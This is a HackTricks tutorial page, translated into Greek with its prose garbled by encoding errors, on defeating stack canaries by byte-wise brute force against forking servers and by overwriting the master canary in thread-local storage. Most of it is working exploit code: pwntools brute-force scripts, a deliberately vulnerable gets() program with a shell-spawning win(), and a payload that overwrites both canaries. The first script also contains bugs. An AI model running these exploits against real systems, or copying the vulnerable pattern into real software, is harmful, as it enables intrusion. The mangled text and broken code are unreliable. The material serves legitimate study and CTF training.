# BF Forked & Threaded Stack Canaries

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Î‘Î½ Î±Î½Ï„Î¹Î¼ÎµÏ„Ï‰Ï€Î¯Î¶ÎµÏ„Îµ Î­Î½Î± Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î± canary ÎºÎ±Î¹ PIE (Position Independent Executable) Ï€Î¹Î¸Î±Î½ÏŒÏ„Î±Ï„Î± Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î±Î½ Ï„ÏÏŒÏ€Î¿ Î½Î± Ï„Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ.**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ **`checksec`** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Î·Î½ ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÎ¹ ÏŒÏ„Î¹ Î­Î½Î± Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î± canary Î±Î½ Î±Ï…Ï„ÏŒ Î­Ï‡ÎµÎ¹ ÏƒÏ„Î±Ï„Î¹ÎºÎ¬ Î¼ÎµÏ„Î±Î³Î»Ï‰Ï„Ï„Î¹ÏƒÏ„ÎµÎ¯ ÎºÎ±Î¹ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î¹ÎºÎ±Î½ÏŒ Î½Î± ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÎ¹ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±.\
Î©ÏƒÏ„ÏŒÏƒÎ¿, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿ Ï€Î±ÏÎ±Ï„Î·ÏÎ®ÏƒÎµÏ„Îµ Ï‡ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î± Î±Î½ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÏÏƒÎµÏ„Îµ ÏŒÏ„Î¹ Î¼Î¹Î± Ï„Î¹Î¼Î® Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î± ÏƒÏ„Î·Î½ Î±ÏÏ‡Î® Î¼Î¹Î±Ï‚ ÎºÎ»Î®ÏƒÎ·Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±Ï‚ ÎºÎ±Î¹ Î±Ï…Ï„Î® Î· Ï„Î¹Î¼Î® ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Ï€ÏÎ¹Î½ Ï„Î·Î½ Î­Î¾Î¿Î´Î¿.
{% endhint %}

## Brute force Canary

ÎŸ ÎºÎ±Î»ÏÏ„ÎµÏÎ¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ Î­Î½Î± Î±Ï€Î»ÏŒ canary ÎµÎ¯Î½Î±Î¹ Î±Î½ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± **Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Ï€Î±Î¹Î´Î¹ÎºÎ­Ï‚ Î´Î¹ÎµÏÎ³Î±ÏƒÎ¯ÎµÏ‚ ÎºÎ¬Î¸Îµ Ï†Î¿ÏÎ¬ Ï€Î¿Ï… ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÏ„Îµ Î¼Î¹Î± Î½Î­Î± ÏƒÏÎ½Î´ÎµÏƒÎ·** Î¼Îµ Î±Ï…Ï„ÏŒ (Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Î´Î¹ÎºÏ„ÏÎ¿Ï…), ÎµÏ€ÎµÎ¹Î´Î® ÎºÎ¬Î¸Îµ Ï†Î¿ÏÎ¬ Ï€Î¿Ï… ÏƒÏ…Î½Î´Î­ÎµÏƒÏ„Îµ ÏƒÎµ Î±Ï…Ï„ÏŒ **Ï„Î¿ Î¯Î´Î¹Î¿ canary Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹**.

ÎˆÏ„ÏƒÎ¹, Î¿ ÎºÎ±Î»ÏÏ„ÎµÏÎ¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ Ï„Î¿ canary ÎµÎ¯Î½Î±Î¹ Î±Ï€Î»Î¬ Î½Î± **Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ Î¼Îµ brute-force Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎ± Ï€ÏÎ¿Ï‚ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎ±**, ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ±Ï„Î±Î»Î¬Î²ÎµÏ„Îµ Î±Î½ Ï„Î¿ Î¼Î±Î½Ï„ÎµÎ¼Î­Î½Î¿ byte Ï„Î¿Ï… canary Î®Ï„Î±Î½ ÏƒÏ‰ÏƒÏ„ÏŒ ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ Î±Î½ Ï„Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± Î­Ï‡ÎµÎ¹ ÎºÎ±Ï„Î±ÏÏÎµÏÏƒÎµÎ¹ Î® ÏƒÏ…Î½ÎµÏ‡Î¯Î¶ÎµÎ¹ Ï„Î· ÎºÎ±Î½Î¿Î½Î¹ÎºÎ® Ï„Î¿Ï… ÏÎ¿Î®. Î£Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± **Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ Î­Î½Î± canary 8 Bytes (x64)** ÎºÎ±Î¹ Î´Î¹Î±ÎºÏÎ¯Î½ÎµÎ¹ Î¼ÎµÏ„Î±Î¾Ï ÎµÎ½ÏŒÏ‚ ÏƒÏ‰ÏƒÏ„Î¬ Î¼Î±Î½Ï„ÎµÎ¼Î­Î½Î¿Ï… byte ÎºÎ±Î¹ ÎµÎ½ÏŒÏ‚ ÎºÎ±ÎºÎ¿Ï byte Î±Ï€Î»Î¬ **ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚** Î±Î½ Î¼Î¹Î± **Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·** ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® (Î­Î½Î±Ï‚ Î¬Î»Î»Î¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ ÏƒÎµ **Î¬Î»Î»Î· ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·** Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¯Î½Î±Î¹ Î· Ï‡ÏÎ®ÏƒÎ· ÎµÎ½ÏŒÏ‚ **try/except**):

### Example 1

Î‘Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î­Ï‡ÎµÎ¹ Ï…Î»Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± 64 bits Î±Î»Î»Î¬ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï…Î»Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÎµÏÎºÎ¿Î»Î± ÎºÎ±Î¹ Î³Î¹Î± 32 bits.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± 2

Î‘Ï…Ï„ÏŒ Î­Ï‡ÎµÎ¹ Ï…Î»Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± 32 bits, Î±Î»Î»Î¬ Î±Ï…Ï„ÏŒ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Î±Î»Î»Î¬Î¾ÎµÎ¹ ÎµÏÎºÎ¿Î»Î± ÏƒÎµ 64 bits.\
Î•Ï€Î¯ÏƒÎ·Ï‚ ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î³Î¹Î± Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï„Î¿ **Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± Î±Î½Î±Î¼Î­Î½ÎµÎ¹ Ï€ÏÏÏ„Î± Î­Î½Î± byte Î³Î¹Î± Î½Î± Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÎ¹ Ï„Î¿ Î¼Î­Î³ÎµÎ¸Î¿Ï‚ Ï„Î·Ï‚ ÎµÎ¹ÏƒÏŒÎ´Î¿Ï…** ÎºÎ±Î¹ Ï„Î¿ payload.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## Threads

Î¤Î± Î½Î®Î¼Î±Ï„Î± Ï„Î·Ï‚ Î¯Î´Î¹Î±Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±Ï‚ Î¸Î± **Î¼Î¿Î¹ÏÎ¬Î¶Î¿Î½Ï„Î±Î¹ Ï„Î¿ Î¯Î´Î¹Î¿ ÎºÎ±Î½Î±ÏÎ¹Î½Î¬ÎºÎ¹**, ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Î¸Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± **brute-force** Î­Î½Î± ÎºÎ±Î½Î±ÏÎ¹Î½Î¬ÎºÎ¹ Î±Î½ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Î­Î½Î± Î½Î­Î¿ Î½Î®Î¼Î± ÎºÎ¬Î¸Îµ Ï†Î¿ÏÎ¬ Ï€Î¿Ï… ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ Î¼Î¹Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ·.&#x20;

ÎœÎ¹Î± Ï…Ï€ÎµÏÏ‡ÎµÎ¯Î»Î¹ÏƒÎ· Î¼Î½Î®Î¼Î·Ï‚ ÏƒÎµ Î¼Î¹Î± Ï€Î¿Î»Ï…Î½Î·Î¼Î±Ï„Î¹ÎºÎ® ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÎµÏ„Î±Î¹ Î¼Îµ ÎºÎ±Î½Î±ÏÎ¹Î½Î¬ÎºÎ¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿ ÎºÏÏÎ¹Î¿ ÎºÎ±Î½Î±ÏÎ¹Î½Î¬ÎºÎ¹ Ï„Î·Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±Ï‚. Î©Ï‚ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î±, Î· Î¼ÎµÎ¯Ï‰ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Î¬Ï‡ÏÎ·ÏƒÏ„Î· ÎµÏ€ÎµÎ¹Î´Î® Î¿ Î­Î»ÎµÎ³Ï‡Î¿Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î¼Îµ Î´ÏÎ¿ ÎºÎ±Î½Î±ÏÎ¹Î½Î¬ÎºÎ¹Î± Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Ï„Î± Î¯Î´Î¹Î± (Î±Î½ ÎºÎ±Î¹ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î±).

### Example

Î¤Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ ÏƒÎµ Buffer Overflow, Î±Î»Î»Î¬ Î­Ï‡ÎµÎ¹ Î¼ÎµÏ„Î±Î³Î»Ï‰Ï„Ï„Î¹ÏƒÏ„ÎµÎ¯ Î¼Îµ ÎºÎ±Î½Î±ÏÎ¹Î½Î¬ÎºÎ¹:
```c
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

// gcc thread_canary.c -no-pie -l pthread -o thread_canary

void win() {
execve("/bin/sh", NULL, NULL);
}

void* vuln() {
char data[0x20];
gets(data);
}

int main() {
pthread_t thread;

pthread_create(&thread, NULL, vuln, NULL);
pthread_join(thread, NULL);

return 0;
}
```
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î· `vuln` ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± Î½Î®Î¼Î±. Î£Ï„Î¿ GDB Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÏÎ¯Î¾Î¿Ï…Î¼Îµ Î¼Î¹Î± Î¼Î±Ï„Î¹Î¬ ÏƒÏ„Î· `vuln`, ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î±, ÏƒÏ„Î¿ ÏƒÎ·Î¼ÎµÎ¯Î¿ ÏŒÏ€Î¿Ï… Ï„Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± ÎºÎ±Î»ÎµÎ¯ Ï„Î· `gets` Î³Î¹Î± Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÎ¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÎµÎ¹ÏƒÏŒÎ´Î¿Ï…:
```bash
gef> break gets
Breakpoint 1 at 0x4010a0
gef> run
...
gef> x/10gx $rdi
0x7ffff7d7ee20: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee30: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee40: 0x0000000000000000      0x493fdc653a156800
0x7ffff7d7ee50: 0x0000000000000000      0x00007ffff7e17ac3
0x7ffff7d7ee60: 0x0000000000000000      0x00007ffff7d7f640
```
Î¤Î¿ Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰ Î±Î½Ï„Î¹Ï€ÏÎ¿ÏƒÏ‰Ï€ÎµÏÎµÎ¹ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… `data`, ÏŒÏ€Î¿Ï… Ï„Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± Î¸Î± Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î·Î½ ÎµÎ¯ÏƒÎ¿Î´Î¿ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·. ÎŸ stack canary Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· `0x7ffff7d7ee48` (`0x493fdc653a156800`), ÎºÎ±Î¹ Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î®Ï‚ ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· `0x7ffff7d7ee50` (`0x00007ffff7e17ac3`):
```bash
gef> telescope $rdi 8 -n
0x7ffff7d7ee20|+0x0000|+000: 0x0000000000000000  <-  $rdi
0x7ffff7d7ee28|+0x0008|+001: 0x0000000000000000
0x7ffff7d7ee30|+0x0010|+002: 0x0000000000000000
0x7ffff7d7ee38|+0x0018|+003: 0x0000000000000000
0x7ffff7d7ee40|+0x0020|+004: 0x0000000000000000
0x7ffff7d7ee48|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7ee50|+0x0030|+006: 0x0000000000000000  <-  $rbp
0x7ffff7d7ee58|+0x0038|+007: 0x00007ffff7e17ac3 <start_thread+0x2f3>  ->  0xe8ff31fffffe6fe9  <-  retaddr[2]
```
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î¿Î¹ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ Ï„Î·Ï‚ ÏƒÏ„Î¿Î¯Î²Î±Ï‚ Î´ÎµÎ½ Î±Î½Î®ÎºÎ¿Ï…Î½ ÏƒÏ„Î·Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® ÏƒÏ„Î¿Î¯Î²Î±:
```bash
gef> vmmap stack
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x00007ffff7580000 0x00007ffff7d83000 0x0000000000803000 0x0000000000000000 rw- <tls-th1><stack-th2>  <-  $rbx, $rsp, $rbp, $rsi, $rdi, $r12
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $r9, $r15
```
ÎŸ ÏƒÏ„Î¿Î¯Î²Î±Ï‚ Ï„Î¿Ï… Î½Î®Î¼Î±Ï„Î¿Ï‚ Ï„Î¿Ï€Î¿Î¸ÎµÏ„ÎµÎ¯Ï„Î±Î¹ Ï€Î¬Î½Ï‰ Î±Ï€ÏŒ Ï„Î·Î½ Î¤Î¿Ï€Î¹ÎºÎ® Î‘Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ· ÎÎ®Î¼Î±Ï„Î¿Ï‚ (TLS), ÏŒÏ€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ Î· ÎºÏÏÎ¹Î± ÎºÎ±Î½Î¬ÏÎ¹:
```bash
gef> tls
$tls = 0x7ffff7d7f640
...
---------------------------------------------------------------------------- TLS ----------------------------------------------------------------------------
0x7ffff7d7f640|+0x0000|+000: 0x00007ffff7d7f640  ->  [loop detected]  <-  $rbx, $r12
0x7ffff7d7f648|+0x0008|+001: 0x00000000004052b0  ->  0x0000000000000001
0x7ffff7d7f650|+0x0010|+002: 0x00007ffff7d7f640  ->  [loop detected]
0x7ffff7d7f658|+0x0018|+003: 0x0000000000000001
0x7ffff7d7f660|+0x0020|+004: 0x0000000000000000
0x7ffff7d7f668|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7f670|+0x0030|+006: 0xb79b79966e9916c4  <-  PTR_MANGLE cookie
0x7ffff7d7f678|+0x0038|+007: 0x0000000000000000
...
```
{% hint style="info" %}
ÎŸÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î±Ï€ÏŒ Ï„Î¹Ï‚ Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ GDB Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÎµ Î¼Î¹Î± ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ [bata24/gef](https://github.com/bata24/gef), Î· Î¿Ï€Î¿Î¯Î± Î­Ï‡ÎµÎ¹ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„ÎµÏ‚ Î±Ï€ÏŒ Ï„Î·Î½ ÏƒÏ…Î½Î®Î¸Î· [hugsy/gef](https://github.com/hugsy/gef).
{% endhint %}

Î©Ï‚ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î±, Î¼Î¹Î± Î¼ÎµÎ³Î¬Î»Î· Ï…Ï€ÎµÏÏ‡ÎµÎ¯Î»Î¹ÏƒÎ· Î¼Î½Î®Î¼Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Ï„Î·Î½ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„ÏŒÏƒÎ¿ Ï„Î¿Ï… stack canary ÏŒÏƒÎ¿ ÎºÎ±Î¹ Ï„Î¿Ï… master canary ÏƒÏ„Î¿ TLS. Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ offset:
```bash
gef> p/x 0x7ffff7d7f668 - $rdi
$1 = 0x848
```
Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÏƒÏÎ½Ï„Î¿Î¼Î¿ exploit Î³Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Ï„Î¿ `win`:
```python
from pwn import *

context.binary = 'thread_canary'

payload  = b'A' * 0x28                    # buffer overflow offset
payload += b'BBBBBBBB'                    # overwritting stack canary
payload += b'A' * 8                       # saved $rbp
payload += p64(context.binary.sym.win)    # return address
payload += b'A' * (0x848 - len(payload))  # padding
payload += b'BBBBBBBB'                    # overwritting master canary

io = context.binary.process()
io.sendline(payload)
io.interactive()
```
## Î†Î»Î»Î± Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± & Î±Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64 bits, no PIE, nx, BF canary, Î³ÏÎ¬ÏˆÏ„Îµ ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î± Î¼Î½Î®Î¼Î· Î­Î½Î± ROP Î³Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Ï„Î¿ `execve` ÎºÎ±Î¹ Î½Î± Î¼ÎµÏ„Î±Î²ÎµÎ¯Ï„Îµ ÎµÎºÎµÎ¯.
* [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)
* 64 bits, no PIE, nx, Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ Î½Î®Î¼Î± ÎºÎ±Î¹ Ï„Î¿ ÎºÏÏÎ¹Î¿ canary.
